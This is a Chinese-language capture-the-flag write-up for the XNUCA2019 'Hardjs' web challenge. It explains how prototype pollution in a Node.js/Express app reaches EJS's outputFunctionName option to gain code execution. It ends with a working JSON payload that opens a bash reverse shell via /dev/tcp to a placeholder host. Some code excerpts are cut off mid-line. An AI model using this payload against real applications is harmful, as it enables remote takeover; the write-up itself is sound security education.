### 0x00 前言
这次XNUCA2019的WEB题四道只有两道被解出，其中这道Hardjs是做出人数较少的一道，还是比较有意思的，所以在此分享一下解题思路。
### 0x01 初步分析
题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是`server.js`和`robot.js`。
先分析`server.js`。
可以发现这个服务器是nodejs，并且用了express这个框架，模板渲染引擎则用了ejs。
审计一下代码可以看到有以下的路由：
  * `/` 首页
  * `/static` 静态文件
  * `/sandbox` 显示用户HTML数据用的沙盒
  * `/login` 登陆
  * `/register` 注册
  * `/get` json接口 获取数据库中保存的数据
  * `/add` 用户添加数据的接口
除了`/static`，`/login`和`/register`以外，所以路由在访问的时候都会经过一个`auth`函数进行身份验证
因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。
另外在初始化的时候有这么一句
    app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())
所以我们可以通过json格式传递参数到服务端
### 0x02 发现问题
在`/get`中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下
    var sql = "select `id`,`dom` from  `html` where userid=? ";
    var raws = await query(sql,[userid]);
    var doms = {}
    var ret = new Array(); 
    for(var i=0;i 1;
      ...
      func = exports.compile(template, options);
      if (options.cache) {
        exports.cache.set(filename, func);
      }
      return func;
    }
跟进生成func的`compile`
    exports.compile = function compile(template, opts) {
      var templ;
      ...
      templ = new Template(template, opts);
      return templ.compile();
    };
发现新建了一个Template对象并执行其成员方法得到返回的func。我们跟进其成员方法`compile`查看。
    compile: function () {
        var src;
        var fn;
        var opts = this.opts;
        var prepended = '';
        var appended = '';
        var escapeFn = opts.escapeFunction;
        var ctor;
        if (!this.source) {
          this.generateSource();
          prepended += '  var __output = [], __append = __output.push.bind(__output);' + '\n';
          if (opts.outputFunctionName) {
            prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
          }
          if (opts._with !== false) {
            prepended +=  '  with (' + opts.localsName + ' || {}) {' + '\n';
            appended += '  }' + '\n';
          }
          appended += '  return __output.join("");' + '\n';
          this.source = prepended + this.source + appended;
        }
        ...
          src = this.source;
        ...
        try {
          if (opts.async) {
            // Have to use generated function for this, since in envs without support,
            // it breaks in parsing
            try {
              ctor = (new Function('return (async function(){}).constructor;'))();
            }
            catch(e) {
              if (e instanceof SyntaxError) {
                throw new Error('This environment does not support async/await');
              }
              else {
                throw e;
              }
            }
          }
          else {
            ctor = Function;
          }
          fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);
        }
        ...
        // Return a callable function which will execute the function
        // created by the source-code, with the passed data as locals
        // Adds a local `include` function which allows full recursive include
        var returnedFn = function (data) {
          var include = function (path, includeData) {
            var d = utils.shallowCopy({}, data);
            if (includeData) {
              d = utils.shallowCopy(d, includeData);
            }
            return includeFile(path, opts)(d);
          };
          return fn.apply(opts.context, [data || {}, escapeFn, include, rethrow]);
        };
        returnedFn.dependencies = this.dependencies;
        return returnedFn;
      },
这段代码中
    if (opts.outputFunctionName) {
            prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
          }
就是我们一直寻找的东西，这个对象会与其他生成的模板字符串一起拼接到`this.source`，然后传递给`src`，接着是`fn`，然后以`returnedFn`返回并最后被执行。而一路跟进的时候可以发现，并没有`outputFunctionName`的身影，所以只要给Object的`prototype`加上这个成员，我们就可以实现从原型链污染到RCE的攻击过程了！
### 0x05 成功攻击
可以发现`process`是可以访问到的，所以我们可以用来反弹shell
最后的payload如下
    {
        "content": {
            "constructor": {
                "prototype": {
                "outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/xx 0>&1\"');var __tmp2"
                }
            }
        },
        "type": "test"
    }
发送5次请求，然后访问`/get`进行原型链污染，最后访问`/`或`/login`触发`render`函数，成功反弹shell并getflag
### 0x06 总结
原型链危害不小，不过找到合适的利用点也很花费审计的时间和精力，原先还以为这是个非预期，投稿的时候看到WP才知道这也在出题师傅的意料之中，tql。
第一次投稿，可能有不少错误，望各位师傅斧正，谢谢。
### 0x07 参考链接